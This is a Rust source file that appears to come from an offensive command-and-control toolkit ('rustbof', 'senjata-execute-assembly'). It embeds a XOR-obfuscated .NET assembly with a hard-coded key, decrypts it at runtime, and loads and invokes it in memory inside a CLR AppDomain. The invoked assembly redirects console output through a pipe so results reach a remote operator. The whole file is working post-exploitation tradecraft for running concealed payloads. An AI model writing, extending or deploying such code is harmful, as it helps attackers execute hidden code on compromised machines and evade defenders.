//! FlushHelper.exe asset + invoke helper. The XOR'd PE bytes are embedded
//! into the orchestrator at compile time and decrypted on demand. The
//! helper rebinds `Console.Out` / `Console.Error` to a `FileStream` built
//! from a raw pipe handle passed in as a hex string.

use alloc::vec::Vec;
use opsec_com::appdomain::AppDomain;
use opsec_com::comptr::ComPtr;

const FLUSH_KEY: [u8; 16] = [
    0xA9, 0x3F, 0x17, 0xC4, 0xEE, 0x0B, 0x8D, 0x51,
    0x22, 0x6A, 0x7F, 0x04, 0x9C, 0xB3, 0xE7, 0x56,
];
const FLUSH_XOR: &[u8] = include_bytes!("../../../bofs/senjata-execute-assembly/assets/flush.dll.xor");

pub fn decrypt_flush() -> Vec<u8> {
    FLUSH_XOR
        .iter()
        .enumerate()
        .map(|(i, &b)| b ^ FLUSH_KEY[i % FLUSH_KEY.len()])
        .collect()
}

/// Load FlushHelper into the given AppDomain and invoke with the pipe
/// handle as a hex-string argument. Logs success/failure via rustbof's
/// eprintln so output reaches the operator.
pub fn do_flush(
    domain: &ComPtr<AppDomain>,
    tag: &str,
    handle_hex: &str,
) {
    let _ = tag; // suppress unused warning when debug-io off

    crate::dlog2(b"[flush] decrypt_flush");
    let bytes = decrypt_flush();
    {
        // Sanity: first byte XOR'd should yield 'M' (0x4D) if asset is
        // a managed PE. log first 4 bytes for verification.
        let mut hdr = 0u32;
        if bytes.len() >= 4 {
            hdr = u32::from_le_bytes([bytes[0], bytes[1], bytes[2], bytes[3]]);
        }
        crate::dlog2_hex(b"[flush]   bytes.len=", bytes.len() as u32);
        crate::dlog2_hex(b"[flush]   first4=", hdr);
    }

    crate::dlog2(b"[flush] load_assembly");
    match unsafe { crate::netfx::load_assembly(domain, &bytes) } {
        Ok(flush_asm) => {
            crate::dlog2(b"[flush]   load_assembly ok");
            crate::dlog2(b"[flush] invoke");
            match unsafe { crate::netfx::invoke(&flush_asm, handle_hex, 0) } {
                Ok(()) => {
                    crate::dlog2(b"[flush]   invoke ok");
                }
                Err(_e) => {
                    crate::dlog2(b"[flush]   invoke FAILED");
                }
            }
        }
        Err(_e) => {
            crate::dlog2(b"[flush]   load_assembly FAILED");
        }
    }
}
